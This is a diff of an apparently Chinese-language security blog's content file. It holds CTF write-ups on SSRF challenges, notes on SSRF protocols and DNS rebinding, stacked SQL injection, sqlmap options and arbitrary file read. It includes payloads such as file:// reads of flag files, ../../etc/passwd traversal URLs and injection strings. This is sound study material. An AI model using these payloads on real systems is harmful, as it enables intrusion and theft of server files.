class="variable">$ch</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="keyword">echo</span> (<span class="variable">$result</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> hacker</span><br></pre></td></tr></table></figure>
+
+<p>没得说</p>
+<h2 id="Web357"><a href="#Web357" class="headerlink" title="Web357"></a>Web357</h2><h3 id="题目-5"><a href="#题目-5" class="headerlink" title="题目"></a>题目</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$x</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;http&#x27;</span>||<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;https&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$ip</span> = <span class="title function_ invoke__">gethostbyname</span>(<span class="variable">$x</span>[<span class="string">&#x27;host&#x27;</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;/br&gt;&#x27;</span>.<span class="variable">$ip</span>.<span class="string">&#x27;&lt;/br&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">filter_var</span>(<span class="variable">$ip</span>, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;ip!&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;scheme&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> scheme</span><br></pre></td></tr></table></figure>
+
+<h3 id="前置基础知识-1"><a href="#前置基础知识-1" class="headerlink" title="前置基础知识"></a>前置基础知识</h3><h5 id="filter-var函数"><a href="#filter-var函数" class="headerlink" title="filter_var函数"></a>filter_var函数</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">filter_var(variable,filter,options)</span><br></pre></td></tr></table></figure>
+
+<p>varieble：必须。规定要过滤的变量</p>
+<p>filter：可选。规定要使用的过滤器的ID。默认是FILTER_SANTIZE_STRING</p>
+<p>FILTER_VALIDATE_IP: 把值作为IP地址来验证，只限IPv4或IPv6或不是来自私有或者保留的范围</p>
+<p><a href="https://www.runoob.com/php/php-ref-filter.html">所有filter</a></p>
+<p>option：可选。规定一个包含标志&#x2F;选项的关联数组或者一个单一的标志&#x2F;选项。检查每个过滤器可能的标志和选项</p>
+<ul>
+<li>FILTER_FLAG_NO_PRIV_RANGE：排除IPv4私有地址段</li>
+</ul>
+<p>​	过滤范围： 192.168.0.0&#x2F;16192.168.0.0&#x2F;16（192.168.0.0 - 192.168.255.255） 10.0.0.0&#x2F;810.0.0.0&#x2F;8（10.0.0.0 - 10.255.255.255） 172.16.0.0&#x2F;12172.16.0.0&#x2F;12（172.16.0.0 - 172.31.255.255）</p>
+<ul>
+<li>FILTER_FLAG_NO_RES_RANGE：排除特殊用途 IP 段</li>
+</ul>
+<p>​	过滤范围： 0.0.0.0&#x2F;80.0.0.0&#x2F;8（保留地址） 127.0.0.0&#x2F;8127.0.0.0&#x2F;8（环回地址） 169.254.0.0&#x2F;16169.254.0.0&#x2F;16（链路本地地址） 224.0.0.0&#x2F;4224.0.0.0&#x2F;4（多播地址） 240.0.0.0&#x2F;4240.0.0.0&#x2F;4（未来保留）</p>
+<h3 id="DNS-rebinding（DNS重新绑定攻击）"><a href="#DNS-rebinding（DNS重新绑定攻击）" class="headerlink" title="DNS rebinding（DNS重新绑定攻击）"></a>DNS rebinding（DNS重新绑定攻击）</h3><h4 id="dwords（双字）编码"><a href="#dwords（双字）编码" class="headerlink" title="dwords（双字）编码"></a>dwords（双字）编码</h4><p>将IP地址转换为32位无符号整型数值，其变种可以转化成十六进制或八进制</p>
+<h4 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h4><p>攻击者注册一个域名，设置很短的TTL，先指向一个合法的公网IP，然后再TTL过期后更新位内网IP。当客户端首次解析域名时得到合法IP，但在后续请求时由于DNS缓存过期，重新解析得到内网IP，从而绕过同源策略，访问本地服务。</p>
+<p>攻击终点在于DNS服务能够在两次DNS查询中返回不用的IP地址，第一次是真正的IP，第二次是攻击目标IP地址。</p>
+<blockquote>
+<p>TTL是英语Time-To-Live的简称，意思为一条域名解析在DNS服务器中的存留时间。当各地的NS服务器接收到解析请求时，就会向域名指定的DNS服务器发出解析请求从而获得解析记录。在获得这个记录之后，记录会在DNS服务器中保存一段时间，这段时间如果再接到这个域名的解析请求，DNS服务器将不再向NS服务器发出请求，而是直接返回刚才获得的记录；而这个记录再DNS服务器上保留的时间，就是TTL值</p>
+</blockquote>
+<h3 id="题目分析-3"><a href="#题目分析-3" class="headerlink" title="题目分析"></a>题目分析</h3><p>代码中一共对域名进行了两次请求，第一次是gethostbyname方法，第二次则是file_get_contets文件读取。</p>
+<h2 id="Web358"><a href="#Web358" class="headerlink" title="Web358"></a>Web358</h2><p>待开发</p>
+<h2 id="Web359"><a href="#Web359" class="headerlink" title="Web359"></a>Web359</h2><p>待开发</p>
+<h2 id="Web360"><a href="#Web360" class="headerlink" title="Web360"></a>Web360</h2><p>待开发</p>
+<p>flag not here, and flag in ffffllllaaaagggg</p>
+]]></content>
+      <categories>
+        <category>计算机</category>
+      </categories>
+      <tags>
+        <tag>Web</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>SSRF漏洞</title>
+    <url>/2025/03/18/SSRF/SSRF%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><h1 id="SSRF漏洞"><a href="#SSRF漏洞" class="headerlink" title="SSRF漏洞"></a>SSRF漏洞</h1><h2 id="SSRF基础"><a href="#SSRF基础" class="headerlink" title="SSRF基础"></a>SSRF基础</h2><p>SSRF（server-side request forgery：服务器端请求伪造）是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统</p>
+<h3 id="相关函数和类"><a href="#相关函数和类" class="headerlink" title="相关函数和类"></a>相关函数和类</h3><h5 id="file-get-contents"><a href="#file-get-contents" class="headerlink" title="file_get_contents()"></a>file_get_contents()</h5><p>将整个文件或一个url所指向的文件读入一个字符串中</p>
+<h5 id="readfile"><a href="#readfile" class="headerlink" title="readfile()"></a>readfile()</h5><p>输出一个文件的内容</p>
+<h5 id="fsockopen"><a href="#fsockopen" class="headerlink" title="fsockopen()"></a>fsockopen()</h5><p>打开一个网络连接或者一个Unix套接字连接</p>
+<h5 id="curl-exec"><a href="#curl-exec" class="headerlink" title="curl_exec()"></a>curl_exec()</h5><p>初始化一个新的会话，返回一个CURL句柄，供curl_setopt(), curl_exec()和curl_close()函数使用</p>
+<h5 id="fopen"><a href="#fopen" class="headerlink" title="fopen()"></a>fopen()</h5><p>打开一个文件或者url</p>
+<h5 id="PHP原生类SoapClient在触发反序列化时可导致SSRF"><a href="#PHP原生类SoapClient在触发反序列化时可导致SSRF" class="headerlink" title="PHP原生类SoapClient在触发反序列化时可导致SSRF"></a>PHP原生类SoapClient在触发反序列化时可导致SSRF</h5><h3 id="相关协议"><a href="#相关协议" class="headerlink" title="相关协议"></a>相关协议</h3><h5 id="file协议"><a href="#file协议" class="headerlink" title="file协议"></a>file协议</h5><p>在有回显的情况下，利用file协议可以读取任意文件的内容</p>
+<h5 id="dict协议"><a href="#dict协议" class="headerlink" title="dict协议"></a>dict协议</h5><p>泄露安装软件版本信息，查看端口，操作内网redis服务等</p>
+<h5 id="gopher协议"><a href="#gopher协议" class="headerlink" title="gopher协议"></a>gopher协议</h5><p>支持发出GET、POST请求。可以先截获get请求包和post请求包，再构造成符合gopher协议的请求。gopher协议时ssrf利用中一个最强大的协议（俗称万能协议）。可用于反弹shell</p>
+<h5 id="http-s协议"><a href="#http-s协议" class="headerlink" title="http&#x2F;s协议"></a>http&#x2F;s协议</h5><p>探测内网主机存活</p>
+<h2 id="漏洞利用方式"><a href="#漏洞利用方式" class="headerlink" title="漏洞利用方式"></a>漏洞利用方式</h2><ol>
+<li>让服务端去访问相应的网址</li>
+<li>让服务端去访问自己所处内网的一些指纹文件来判断是否存在相应的cms</li>
+<li>可以使用file、dict、gopher[11]、ftp协议进行请求访问相应的文件</li>
+<li>攻击内网web应用（可以向内部任意主机的任意端口发送精心构造的数据包{payload}）</li>
+<li>攻击内网应用程序（利用跨协议通信技术）</li>
+<li>判断内网主机是否存活：方法是访问看是否有端口开放</li>
+<li>DoS攻击（请求大文件，始终保持连接keep-alive always）</li>
+</ol>
+]]></content>
+      <categories>
+        <category>计算机</category>
+      </categories>
+      <tags>
+        <tag>Web</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>网络协议</title>
+    <url>/2025/03/18/SSRF/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><h3 id="URL的一般格式"><a href="#URL的一般格式" class="headerlink" title="URL的一般格式"></a>URL的一般格式</h3><p><code>&lt;协议&gt;://&lt;主机&gt;:&lt;端口&gt;/&lt;路径&gt;</code></p>
+<ul>
+<li>协议</li>
+<li>主机：指该主机在互联网上的域名，一个URL中也可以使用IP作为域名</li>
+<li>端口：跟在域名后，以“：”作为分割符。默认端口是80</li>
+<li>路径：协议和主机部分，字母不区分大小写。但是路径有时要区分大小写</li>
+</ul>
+<h2 id="File协议"><a href="#File协议" class="headerlink" title="File协议"></a>File协议</h2><p>file协议也叫本地文件传输协议，主要用于访问本地计算机中的文件。</p>
+<h5 id="基本格式"><a href="#基本格式" class="headerlink" title="基本格式"></a>基本格式</h5><p><code>file:///D:/mywebproject/bigwatermelon/index.html</code></p>
+<h3 id="HTTP协议"><a href="#HTTP协议" class="headerlink" title="HTTP协议"></a>HTTP协议</h3><p><code>http://127.0.0.1:5500/pocon041</code></p>
+]]></content>
+      <categories>
+        <category>计算机</category>
+      </categories>
+      <tags>
+        <tag>Web</tag>
       </tags>
   </entry>
   <entry>
@@ -1278,59 +1543,6 @@
   </entry>
   <entry>
     <title></title>
-    <url>/2025/03/18/SQLi/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><h1 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h1><p>平常我们注入时都是通常对原来sql语句传输数据的地方进行相关修改，注入情况会应为该语句本身的情况而受到相关限制，例如进行select语句的时候，无法进行增、删、改。但堆叠注入则完全打破了这种限制，其名字顾名思义，就是可以堆一堆sql注入进行注入，这个时候我们就不受前面语句的限制可以为所欲为了。原理就是将原来的语句构造完后加上分号。</p>
-<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="SUCTF-2019-EasySQL"><a href="#SUCTF-2019-EasySQL" class="headerlink" title="[SUCTF 2019]EasySQL"></a>[SUCTF 2019]EasySQL</h3><p>当输入123的时候弹出以下内容。并同时发现这里是POST传参。</p>
-<img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250312204200052.png" alt="image-20250312204200052" style="zoom: 50%;">
-
-<p>尝试进行字符和数字的验证，发现当输入万能密码的时候情况如下。这里应该是对and等等关键词进行了过滤。</p>
-<img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250312204306434.png" alt="image-20250312204306434" style="zoom:50%;">
-
-<p>常规思路不太行，而且回文只有这几种。于是考虑堆叠注入。</p>
-<ol>
-<li>得到库名</li>
-</ol>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">query=0;show databases;</span><br></pre></td></tr></table></figure>
-
-<img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250312204503297.png" alt="image-20250312204503297" style="zoom: 80%;">
-
-<p>发现过滤的东西太多了。这道题目前对我来说有点偏，只放个链接在这</p>
-<p><a href="https://blog.csdn.net/RABCDXB/article/details/111398725">https://blog.csdn.net/RABCDXB/article/details/111398725</a></p>
-<p>1;set sql_mode&#x3D;PIPES_AS_CONCAT;select 1</p>
-]]></content>
-  </entry>
-  <entry>
-    <title>SSRF漏洞</title>
-    <url>/2025/03/18/SSRF/SSRF%E6%BC%8F%E6%B4%9E/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><h1 id="SSRF漏洞"><a href="#SSRF漏洞" class="headerlink" title="SSRF漏洞"></a>SSRF漏洞</h1><h2 id="SSRF基础"><a href="#SSRF基础" class="headerlink" title="SSRF基础"></a>SSRF基础</h2><p>SSRF（server-side request forgery：服务器端请求伪造）是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统</p>
-<h3 id="相关函数和类"><a href="#相关函数和类" class="headerlink" title="相关函数和类"></a>相关函数和类</h3><h5 id="file-get-contents"><a href="#file-get-contents" class="headerlink" title="file_get_contents()"></a>file_get_contents()</h5><p>将整个文件或一个url所指向的文件读入一个字符串中</p>
-<h5 id="readfile"><a href="#readfile" class="headerlink" title="readfile()"></a>readfile()</h5><p>输出一个文件的内容</p>
-<h5 id="fsockopen"><a href="#fsockopen" class="headerlink" title="fsockopen()"></a>fsockopen()</h5><p>打开一个网络连接或者一个Unix套接字连接</p>
-<h5 id="curl-exec"><a href="#curl-exec" class="headerlink" title="curl_exec()"></a>curl_exec()</h5><p>初始化一个新的会话，返回一个CURL句柄，供curl_setopt(), curl_exec()和curl_close()函数使用</p>
-<h5 id="fopen"><a href="#fopen" class="headerlink" title="fopen()"></a>fopen()</h5><p>打开一个文件或者url</p>
-<h5 id="PHP原生类SoapClient在触发反序列化时可导致SSRF"><a href="#PHP原生类SoapClient在触发反序列化时可导致SSRF" class="headerlink" title="PHP原生类SoapClient在触发反序列化时可导致SSRF"></a>PHP原生类SoapClient在触发反序列化时可导致SSRF</h5><h3 id="相关协议"><a href="#相关协议" class="headerlink" title="相关协议"></a>相关协议</h3><h5 id="file协议"><a href="#file协议" class="headerlink" title="file协议"></a>file协议</h5><p>在有回显的情况下，利用file协议可以读取任意文件的内容</p>
-<h5 id="dict协议"><a href="#dict协议" class="headerlink" title="dict协议"></a>dict协议</h5><p>泄露安装软件版本信息，查看端口，操作内网redis服务等</p>
-<h5 id="gopher协议"><a href="#gopher协议" class="headerlink" title="gopher协议"></a>gopher协议</h5><p>支持发出GET、POST请求。可以先截获get请求包和post请求包，再构造成符合gopher协议的请求。gopher协议时ssrf利用中一个最强大的协议（俗称万能协议）。可用于反弹shell</p>
-<h5 id="http-s协议"><a href="#http-s协议" class="headerlink" title="http&#x2F;s协议"></a>http&#x2F;s协议</h5><p>探测内网主机存活</p>
-<h2 id="漏洞利用方式"><a href="#漏洞利用方式" class="headerlink" title="漏洞利用方式"></a>漏洞利用方式</h2><ol>
-<li>让服务端去访问相应的网址</li>
-<li>让服务端去访问自己所处内网的一些指纹文件来判断是否存在相应的cms</li>
-<li>可以使用file、dict、gopher[11]、ftp协议进行请求访问相应的文件</li>
-<li>攻击内网web应用（可以向内部任意主机的任意端口发送精心构造的数据包{payload}）</li>
-<li>攻击内网应用程序（利用跨协议通信技术）</li>
-<li>判断内网主机是否存活：方法是访问看是否有端口开放</li>
-<li>DoS攻击（请求大文件，始终保持连接keep-alive always）</li>
-</ol>
-]]></content>
-      <categories>
-        <category>计算机</category>
-      </categories>
-      <tags>
-        <tag>Web</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title></title>
     <url>/2025/03/18/SQLi/Sqlmap%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><h1 id="Sqlmap"><a href="#Sqlmap" class="headerlink" title="Sqlmap"></a>Sqlmap</h1><h3 id="常用参数"><a href="#常用参数" class="headerlink" title="常用参数"></a>常用参数</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">--version                         <span class="comment">#显示程序的版本号并退出</span></span><br><span class="line">-h, --<span class="built_in">help</span>                        <span class="comment">#显示此帮助消息并退出</span></span><br><span class="line">-u                                <span class="comment">#设置目标URL</span></span><br><span class="line">-p                                <span class="comment">#指定测试参数</span></span><br><span class="line">-D                                <span class="comment">#指定要进行枚举的数据库名</span></span><br><span class="line">-U                                <span class="comment">#指定要进行枚举的数据库表</span></span><br><span class="line">-T       						<span class="comment">#枚举列的信息</span></span><br><span class="line">-C                                <span class="comment">#指定要进行枚举的数据库列</span></span><br><span class="line">-U                                <span class="comment">#指定要进行枚举的数据车用户</span></span><br><span class="line">--current-user                    <span class="comment">#获取当前用户名称</span></span><br><span class="line">--current-db                      <span class="comment">#获取当前数据库名称</span></span><br><span class="line">--cookie                          <span class="comment">#设置cookie值</span></span><br><span class="line">--dbs                             <span class="comment">#列出数据库</span></span><br><span class="line">--tables                          <span class="comment">#列出数据库中的表</span></span><br><span class="line">--columns                         <span class="comment">#列出表中的列</span></span><br><span class="line">--dump                            <span class="comment">#列出表中的字段</span></span><br><span class="line">--sql-shell                       <span class="comment">#执行SQL命令</span></span><br><span class="line">--os-cmd                          <span class="comment">#执行系统命令</span></span><br><span class="line">--os-shell                        <span class="comment">#与系统交互shell</span></span><br><span class="line">-r                                <span class="comment">#加载外部请求包</span></span><br><span class="line">--batch                           <span class="comment">#使用默认参数进行</span></span><br><span class="line">--data=DATA                       <span class="comment">#通过POST发送数据字符串</span></span><br><span class="line">--level=LEVEL                     <span class="comment">#执行测试的等级（1-5，默认为1)</span></span><br><span class="line">--risk=RISK                       <span class="comment">#执行测试的风险（O-3，默认为1)</span></span><br><span class="line">-v VERBOSE                        <span class="comment">#详细级别:0-6(默认为1)</span></span><br><span class="line">--proxy=PROXY                     <span class="comment">#使用HTTP代理连接到目标URL</span></span><br><span class="line">--user-agent                      <span class="comment">#指定HTTP User-Agent</span></span><br><span class="line">--tamper=TAMPER                   <span class="comment">#使用给定的脚本(S)篡改注入数据</span></span><br><span class="line">--random-agent                    <span class="comment">#随机的请求头!</span></span><br></pre></td></tr></table></figure>
 
@@ -1353,164 +1565,39 @@
 ]]></content>
   </entry>
   <entry>
-    <title>任意文件读取漏洞</title>
-    <url>/2025/03/18/SSRF/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><h1 id="任意文件读取漏洞"><a href="#任意文件读取漏洞" class="headerlink" title="任意文件读取漏洞"></a>任意文件读取漏洞</h1><p>允许攻击者在服务器上读取任何文件，而不仅仅是哪些应该公开访问的文件。</p>
-<h2 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h2><p>某些Web应用通过参数传递文件名，然后将文件内容直接包含到页面中。如果没有对传入的文件名进行严格的验证，攻击者可能传递恶意文件路径，从而读取服务器上的敏感内容</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://example.com/index.php?page=../../../../etc/passwd</span><br></pre></td></tr></table></figure>
+    <title></title>
+    <url>/2025/03/18/SQLi/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><h1 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h1><p>平常我们注入时都是通常对原来sql语句传输数据的地方进行相关修改，注入情况会应为该语句本身的情况而受到相关限制，例如进行select语句的时候，无法进行增、删、改。但堆叠注入则完全打破了这种限制，其名字顾名思义，就是可以堆一堆sql注入进行注入，这个时候我们就不受前面语句的限制可以为所欲为了。原理就是将原来的语句构造完后加上分号。</p>
+<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="SUCTF-2019-EasySQL"><a href="#SUCTF-2019-EasySQL" class="headerlink" title="[SUCTF 2019]EasySQL"></a>[SUCTF 2019]EasySQL</h3><p>当输入123的时候弹出以下内容。并同时发现这里是POST传参。</p>
+<img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250312204200052.png" alt="image-20250312204200052" style="zoom: 50%;">
 
+<p>尝试进行字符和数字的验证，发现当输入万能密码的时候情况如下。这里应该是对and等等关键词进行了过滤。</p>
+<img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250312204306434.png" alt="image-20250312204306434" style="zoom:50%;">
 
-
-<h2 id="路径遍历漏洞"><a href="#路径遍历漏洞" class="headerlink" title="路径遍历漏洞"></a>路径遍历漏洞</h2><p>这种漏洞发生在用户输入的文件路径未经过验证直接用于文件操作的情况下。攻击者可以利用  ..&#x2F; 这样的路径遍历序列访问超出预期目录的文件</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://example.com/download?file=../../../../etc/passwd</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="文件解析漏洞"><a href="#文件解析漏洞" class="headerlink" title="文件解析漏洞"></a>文件解析漏洞</h2><p>一些Web应用程序允许用户上传文件，但没有正确验证上传文件的类型和内容，攻击者可以上传一个恶意文件，然后通过解析这个文件读取服务器上的其他文件</p>
-]]></content>
-      <categories>
-        <category>计算机</category>
-      </categories>
-      <tags>
-        <tag>Web</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>网络协议</title>
-    <url>/2025/03/18/SSRF/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><h3 id="URL的一般格式"><a href="#URL的一般格式" class="headerlink" title="URL的一般格式"></a>URL的一般格式</h3><p><code>&lt;协议&gt;://&lt;主机&gt;:&lt;端口&gt;/&lt;路径&gt;</code></p>
-<ul>
-<li>协议</li>
-<li>主机：指该主机在互联网上的域名，一个URL中也可以使用IP作为域名</li>
-<li>端口：跟在域名后，以“：”作为分割符。默认端口是80</li>
-<li>路径：协议和主机部分，字母不区分大小写。但是路径有时要区分大小写</li>
-</ul>
-<h2 id="File协议"><a href="#File协议" class="headerlink" title="File协议"></a>File协议</h2><p>file协议也叫本地文件传输协议，主要用于访问本地计算机中的文件。</p>
-<h5 id="基本格式"><a href="#基本格式" class="headerlink" title="基本格式"></a>基本格式</h5><p><code>file:///D:/mywebproject/bigwatermelon/index.html</code></p>
-<h3 id="HTTP协议"><a href="#HTTP协议" class="headerlink" title="HTTP协议"></a>HTTP协议</h3><p><code>http://127.0.0.1:5500/pocon041</code></p>
-]]></content>
-      <categories>
-        <category>计算机</category>
-      </categories>
-      <tags>
-        <tag>Web</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>CTF-SHOW刷题记录Web5</title>
-    <url>/2025/03/18/SSRF/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><h1 id="CTFshow"><a href="#CTFshow" class="headerlink" title="CTFshow"></a>CTFshow</h1><h2 id="Web351"><a href="#Web351" class="headerlink" title="Web351"></a>Web351</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);			<span class="comment">#关闭所有错误报告，防止错误信息泄露给用户</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);	<span class="comment">#高亮显示当前文件</span></span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];			<span class="comment">#使用POST方法传递参数url，赋值给变量$url，这里并没有验证用户的输入</span></span><br><span class="line"><span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);		<span class="comment">#初始化cURL会话，用户提供的URL将被用于发起HTTP请求</span></span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);			<span class="comment">#表示不包含响应头在输出中</span></span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);	<span class="comment">#让curl_exec返回获取的内容不是直接输出</span></span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);		<span class="comment">#执行curl_exec，结果存入$result</span></span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);			<span class="comment">#关闭会话</span></span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$result</span>);				<span class="comment">#输出结果</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<h4 id="前置基础讲解"><a href="#前置基础讲解" class="headerlink" title="前置基础讲解"></a>前置基础讲解</h4><p>curl_exec函数用于执行给定的cURL会话</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 创建一个cURL资源</span></span><br><span class="line"><span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置URL和相应的选项</span></span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="string">&quot;http://www.w3cschool.cc/&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 抓取URL并把它传递给浏览器</span></span><br><span class="line"><span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 关闭cURL资源，并且释放系统资源</span></span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url=127.0.0.1/flag.php</span><br><span class="line"></span><br><span class="line">url=file:///var/www/html/flag.php</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>为什么是127.0.0.1（localhost）？因为这样可以通过SSRF漏洞让服务器向自己发起请求，利用本地换回地址绕过外部防火墙或访问限制</li>
-<li>&#x2F;var是Linux系统中存放可变数据的目录</li>
-<li>&#x2F;var&#x2F;www通常是Web服务器存放网页文件的默认位置</li>
-<li>html目录是Web服务器的文档根目录，所有可通过Web访问的文件都应放在这里</li>
-</ul>
